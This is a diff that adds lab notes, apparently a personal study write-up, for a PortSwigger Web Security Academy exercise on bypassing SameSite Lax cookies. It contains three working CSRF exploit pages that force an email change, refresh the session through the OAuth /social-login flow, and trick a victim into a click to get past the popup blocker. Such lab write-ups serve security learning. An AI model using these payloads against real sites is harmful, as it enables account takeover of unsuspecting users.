@@ -207,8 +207,69 @@ when observing a `POST /my-account/change-email`, and your change request method
 
 ### SameSite Lax bypass via cookie refresh
 
+- in exploit server
+
+```
+<script>
+    history.pushState('', '', '/')
+</script>
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="foo@bar.com" />
+    <input type="submit" value="Submit request" />
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+```
+
+- either you will be logged in when exploited based on whether the user logged in the last 2 minutes
+
+**Now we need to bypass samesite restrictions**
+- notice whenever visiting `/social-login` the oauth flow happens and sends a new session cookie even if you were already logged in
+- go back to the exploit server and change the payload as such:
+
+```
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@web-security-academy.net">
+</form>
+<script>
+    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+    setTimeout(changeEmail, 5000);
+
+    function changeEmail(){
+        document.forms[0].submit();
+    }
+</script>
+```
+
+- store and view the exploit and observe that the initial request gets blocked by the browsers popup blocker
+
+**Bypassing the popup blocker**
+- popups are blocked becuase you haven't manually interacted with the page
+- tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked
+
+```
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@portswigger.net">
+</form>
+<p>Click anywhere on the page</p>
+<script>
+    window.onclick = () => {
+        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+        setTimeout(changeEmail, 5000);
+    }
+
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
+```
+
+- store view yourself, then devlier to victim
+
+### CSRF where Referer validation depends on header being present
 
 
 
 
-
+ 
